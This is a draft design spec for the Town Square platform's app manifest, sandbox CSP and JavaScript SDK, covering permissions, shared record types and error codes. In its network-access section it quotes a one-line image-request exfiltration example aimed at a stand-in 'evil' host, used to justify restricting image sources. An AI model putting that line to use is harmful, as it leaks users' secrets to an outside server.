---
type: spec
title: Town Square creation manifest and SDK surface
status: draft
updated: 2026-08-03
---

# Manifest and SDK

The contract every creation is written against. This is the thing that has to
outlive every other decision, because breaking it strands every app residents
have built. Design it to be small and boring.

Both authoring doors target this: the MCP server's `get_sdk_docs` returns it, and
the starter template ships it as `AGENTS.md`. One source of truth.

## A creation is a folder

```
my-creation/
  townsquare.json     manifest, required
  index.html          entry, required
  icon.svg            required, 1:1
  app.js
  styles.css
  ...
```

Static files only. No build step required, though people can use one. The
uploaded artifact is source, and source is what gets reviewed and what others
can fork.

## The manifest: `townsquare.json`

```json
{
  "manifest_version": 1,
  "sdk": 1,

  "name": "Flock Camera Map",
  "tagline": "Every known ALPR camera in town",
  "description": "A community-maintained map of automated license plate readers.",
  "version": "1.2.0",
  "tags": ["maps", "privacy", "civic"],

  "entry": "index.html",
  "icon": "icon.svg",

  "display": {
    "surface": "full",
    "height": "auto"
  },

  "permissions": {
    "identity": "handle",
    "read": ["flock_camera"],
    "write": ["flock_camera"],
    "network": ["tile.openstreetmap.org"],
    "storage": true,
    "device": []
  },

  "defines": [
    {
      "type": "flock_camera",
      "label": "Flock camera",
      "schema": {
        "lat":  { "type": "number", "required": true },
        "lng":  { "type": "number", "required": true },
        "note": { "type": "string", "maxLength": 500 },
        "confirmed_on": { "type": "date" }
      }
    }
  ]
}
```

### Field notes

**`author` and `id` are both deliberately absent.** The platform assigns both from
the submitting account. Self-asserted authorship is an impersonation hole, and a
self-asserted `id` is the same hole wearing a different hat: slugs are globally
contended, so a manifest that names its own id lets someone squat a slug or aim an
update at another resident's creation. The platform derives the slug from `name`,
returns it on first submission, and later versions echo it back as `slug` for
confirmation only. A manifest containing `author` or `id` is a hard validation
error, not a warning.

**`sdk` and `manifest_version` are both numbers.** They were briefly a string and a
number, which a generated manifest gets wrong about half the time.

**`permissions` is the reviewer's whole job.** An admin should be able to read
this block and know what the app can reach without reading a line of code. Every
capability is default-deny and must be declared. The bridge enforces the
declaration at runtime, so a manifest that does not ask for `write` cannot write
even if its code tries.

- `identity`: `"none"` or `"handle"`. There is no level that exposes an email or
  a real name, because that data should not be reachable from a creation at all.
- `read` / `write`: **record types only**, singular snake_case, validated against
  the town's `record_types`. Ingested town content (events, notices, businesses)
  is read through `town.*` and needs **no declaration at all**. An earlier draft
  of this example mixed both namespaces, which matters because models copy
  examples.
- `network`: **https only, bare hostnames**. No wildcards, no ports, no paths.
- `storage`: per creation, per user key-value, **capped at 64 KB per user**. For
  preferences and local state, not for shared data. Keyed on creation id, so it
  survives a rename; a fork starts empty.
- `device`: reserved for things like `["geolocation"]`. Validated but **must be
  empty at launch**. The field exists now so a map app has somewhere to ask later
  without an SDK break.

**`defines` is how the compounding actually happens.** A creation that produces a
new kind of record declares its type and schema here. Once `flock_camera` exists,
any other creation can request it under `read`. That is the mechanism that turns
one resident's dataset into the next builder's input, and it is why write-back is
worth the trouble.

**Types are town-wide and the definer has no claim.** Ownership of a shared fact is
a strange thing to assert, and a claim would let an abandoned creation hold a
town's data hostage.

Schema evolution is **additive only**: a later creation may add optional fields to
an existing type, and may never retype, narrow, or remove an existing field. First
definer wins on the original shape. A creation whose `defines` conflicts with an
existing type is rejected at validation, not at review, so nobody discovers it late.

The practical rule for builders: if a type already exists, list it under
`permissions.read` and do **not** redefine it, and never invent a parallel type
with a different name for the same thing.

### Correction on network access

Earlier I said the CSP should restrict network access to Town Square's own API.
**That is too strict and would break obvious cases**, most immediately a map,
which needs tile servers. A hard lock would make the Flock camera app impossible.

The workable version is the browser extension model: **default deny, with an
explicit declared allowlist that an admin reviews.** `permissions.network` lists
hostnames, review is where they get judged, and the platform compiles them into
the CSP. Undeclared hosts remain blocked at runtime. Exfiltration risk is
therefore visible in the manifest rather than buried in code.

**Which directives, exactly.** A flat host list is ambiguous, and the ambiguity is
itself a hole. Declared hosts apply to `connect-src`, `img-src`, `media-src` and
`font-src` only. The `img-src` clause is not optional: without it, an implementer
locks down `fetch` and leaves the image-GET exfiltration channel wide open, since
`new Image().src = 'https://evil/?' + secret` needs no response to leak.

**`script-src` is always `'self'`, unconditionally, and is never influenced by the
manifest.** That is the mechanism that enforces vendoring. Without it, "everything
is vendored" is a policy nobody checks. The rest of the compiled policy:

```
default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
font-src 'self' <declared>; img-src 'self' data: <declared>;
media-src 'self' <declared>; connect-src 'self' <declared>;
frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'
```

`'unsafe-eval'` is denied, which is also why `.wasm` is excluded at launch: WASM
would need `wasm-unsafe-eval`, reopening fetch-and-execute-remote-code.

The policy is compiled **at publish time and frozen on the version row**, then
served verbatim. It is never recomputed per request from the manifest, because a
human approved that exact string and a mutable input to a reviewed security
decision is not a security decision.

## The SDK

Deliberately small. Every additional concept is another thing a language model
gets subtly wrong, and an LLM writes most of these.

```js
import { town, user, records, storage, app } from '@townsquare/sdk'
```

### `town`, reading the town

```js
await town.info()
// { id: 'russellville-ar', name: 'Russellville', timezone: 'America/Chicago' }

await town.thisWeek()
// { today: [...], weekend: [...], comingUp: [...], notices: [...] }

await town.items({ type: 'event', since: '2026-08-01', limit: 50, cursor })
// { items: [...], nextCursor: '...' }

await town.item(id)

await town.businesses({ tag: 'restaurant', q: 'burrito', limit: 50, cursor })
// { items: [...], nextCursor: '...' }
```

### `user`, who is here

```js
await user.current()
// { handle: 'tswic', verified: true }  or  null when signed out
```

That is the entire identity surface. A handle and a boolean. A creation never
sees an email, a real name, a location, or a session token. Anything needing more
is a platform feature, not a creation feature.

### `records`, shared town data a creation can write

```js
await records.list('flock_camera', { since, limit, cursor })
await records.get('flock_camera', id)

await records.create('flock_camera', { lat, lng, note })
await records.update('flock_camera', id, { note: 'removed 2026-07' })

await records.history('flock_camera', id)
// [{ version, data, author, created_at, reverted_from }, ...]
```

**Every call takes the type explicitly, including the ones that look like they
only need an id.** Permission is declared by type, so a bare id would force the
host to resolve id to type before it could decide whether the call is allowed.
That turns the permission check into an enumeration oracle: probing ids for an
undeclared type returns a distinguishable error and leaks which records exist.
Passing the type makes the check a pure lookup, and a type/id mismatch is simply
`not_found`.

The type argument must be a **literal string**, not a variable or a template. A
dynamic type is a validation error, because a reviewer cannot see what an app
reads if the source does not say.

There is no `records.delete`. Nothing is destroyed. Records go stale or hidden,
and revert is a platform operation performed by the committee through a moderator
API, not something a creation can invoke. This is what keeps light-touch
moderation viable.

`records.update` is deliberately open: any verified resident may update any record
of a type the creation declares. This is a wiki, which is the intent, but it is
worth stating rather than discovering. Per-user write rate limits apply.

Attribution is automatic on every write: the acting user and the creation are
both recorded. The builder never touches it, which is precisely why it cannot be
forged.

### `storage`, private scratch space

```js
await storage.get('filters')
await storage.set('filters', { showInactive: false })
```

Scoped to this creation and this user. Not shared, not readable by other
creations, not a database.

### `app`, lifecycle and chrome

```js
app.ready()               // tell the host the app has rendered
app.setHeight(720)        // ignored when display.height is "auto"
app.setTitle('12 cameras mapped')   // shown in Town Square chrome
await app.openLink('tel:+14795551212')   // from a click handler; see below
```

`setHeight` under `height: "auto"` is a **no-op, not an error**, because generated
code calls it unconditionally. Reported heights are clamped to 200 to 4000 px.
Under `"auto"` the host shows a 320 px skeleton and gives the guest 10 seconds to
call `app.ready()`; past that it renders an it-did-not-load state rather than an
empty box.

`setTitle` accepts up to 80 characters of plain text, rendered as a text node.

**Links just work.** A creation's frame cannot open pages itself, so the SDK
catches clicks on `<a href>` links that leave the creation (including
`target="_blank"`, `tel:` and `mailto:`) and calls `app.openLink` for it, and
routes `window.open` the same way. Town Square shows the resident where the
link goes, with the real host name, and opens it only if they agree. Allowed:
`https:`, `http:` (flagged as not private), `tel:`, and `mailto:` with one
address plus an optional subject and body. Refused: `javascript:`, `data:`, IP
addresses, local network names, links with a username or password, and
`cc`/`bcc`. A call that does not follow a press inside the creation is refused,
and so is a second link while a dialog is open. Links to the creation's own
pages are left alone.

### Theming comes free

The host injects the Town Square design tokens as CSS custom properties, so a
creation that uses them looks native without importing anything:

```css
--ts-navy: #2C3E50;  --ts-terracotta: #C4775A;  --ts-sage: #7D9B76;
--ts-gold: #D4A853;  --ts-cream: #FAF8F5;       --ts-surface: #FFFDFB;
--ts-font-serif: 'Libre Baskerville', serif;
--ts-radius; --ts-space-1 ... --ts-space-6;
```

This matters more than it looks. It is what makes fifty independently built apps
feel like one town square rather than a pile of widgets, and it costs a builder
nothing to adopt. It also means a town that reskins Town Square reskins every
creation with it, which is the multi-town theming seam paying off.

### Errors

Everything async throws `TownSquareError` with a stable `code`. Stable codes
matter because generated code branches on them, so the list is closed and adding
to it is free only until SDK 1 ships.

| code | when |
|---|---|
| `not_verified` | signed in, but not a verified resident, and the call writes |
| `unauthenticated` | signed out and the call needs a user |
| `permission_denied` | capability not declared in the manifest |
| `rate_limited` | over budget, carries `retry_after` |
| `not_found` | no such record, or type/id mismatch |
| `invalid_record` | payload fails the type's schema |
| `invalid_request` | malformed params or unknown method. **the one builders hit most** |
| `conflict` | a concurrent update lost the race |
| `too_large` | payload over a documented limit |
| `unavailable` | host or upstream failed or timed out. the only retryable one besides `rate_limited` |

The last five were added after the first draft. The original five had no code for
a malformed call, an unauthenticated call, or a timeout, which are exactly the
cases generated code hits first.

## Runtime and enforcement

- Creation runs in a sandboxed iframe on a **separate registrable domain**, so the
  session cookie is structurally unable to reach it and the browser puts it in a
  different process. Not policy, the cookie jar.
- The SDK is the only channel out, over a `MessagePort` established by a one-shot
  handshake. One bridge to audit.
- The bridge checks every call against the frozen manifest permissions **on the
  host side of the port**. The guest-side grants object is advisory, so it can
  produce a good error message but is never the boundary. Hand-written port
  messages that bypass the SDK entirely still get `permission_denied`.
- Undeclared capability fails closed.
- CSP is as compiled above, frozen at publish.
- Writes additionally check that the acting user is a verified resident.
- The wire envelope carries its own version field (`ts: 1`), separate from `sdk`
  and `manifest_version`, so the transport can evolve independently.

## Versioning

`manifest_version` and `sdk` are separate on purpose. The SDK can add capability
without invalidating manifests, and manifests can gain fields without forcing an
SDK bump.

The commitment worth making now: **SDK 1 never breaks.** New things get added,
nothing gets removed or changed underneath. Residents will not maintain their
apps, and an app that stops working is worse for the town than one that was never
built.

## Open

- Does the type definer have any claim over a type, or are types town-wide.
  Leaning town-wide.
- Size limits on bundles, and whether npm dependencies are allowed at all or
  everything must be vendored. Vendoring is far easier to review.
- Whether a creation can read another creation's `defines` schema at runtime for
  discovery, or only the records themselves.
